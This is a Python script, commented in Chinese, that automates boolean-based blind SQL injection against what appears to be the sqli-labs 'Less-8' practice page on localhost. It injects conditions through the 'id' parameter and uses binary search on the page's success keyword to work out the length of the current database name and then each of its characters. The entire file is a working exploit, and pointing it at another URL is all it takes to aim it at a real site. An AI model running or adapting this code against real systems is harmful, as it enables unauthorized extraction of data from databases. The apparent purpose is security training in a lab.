import requests
import time

# 目标URL
url = "http://127.0.0.1/sqli/Less-8/index.php"
SUCCESS_KEYWORD = "You are in"

# 字符集（按ASCII排序）
charset = " abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_-.%()[]{}"
sorted_chars = sorted(charset)


def check_condition(condition):
    """检查SQL条件是否成立"""
    payload = f"1' AND ({condition}) -- "
    try:
        response = requests.get(url, params={"id": payload}, timeout=5)
        return SUCCESS_KEYWORD in response.text
    except requests.exceptions.RequestException as e:
        print(f"请求错误: {e}")
        return False


def get_database_length(max_length=50):
    """使用二分法查找数据库名长度"""
    low, high = 1, max_length
    while low <= high:
        mid = (low + high) // 2
        if check_condition(f"length(database()) = {mid}"):
            return mid
        elif check_condition(f"length(database()) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return 0


def get_char_at_position(pos):
    """使用二分法查找指定位置的字符"""
    low, high = 0, len(sorted_chars) - 1
    while low <= high:
        mid = (low + high) // 2
        if check_condition(f"ASCII(SUBSTRING(database(), {pos}, 1)) > {ord(sorted_chars[mid])}"):
            low = mid + 1
        else:
            high = mid - 1
    if low < len(sorted_chars) and check_condition(f"SUBSTRING(database(), {pos}, 1) = '{sorted_chars[low]}'"):
        return sorted_chars[low]
    return "?"


def get_database_name(length):
    """获取完整数据库名"""
    db_name = ""
    for i in range(1, length + 1):
        char = get_char_at_position(i)
        db_name += char
        print(f"当前数据库名: {db_name}")
        time.sleep(0.1)
    return db_name


if __name__ == "__main__":
    length = get_database_length()
    if length:
        print(f"数据库名长度: {length}")
        name = get_database_name(length)
        print(f"数据库名: {name}")
    else:
        print("无法获取数据库名")
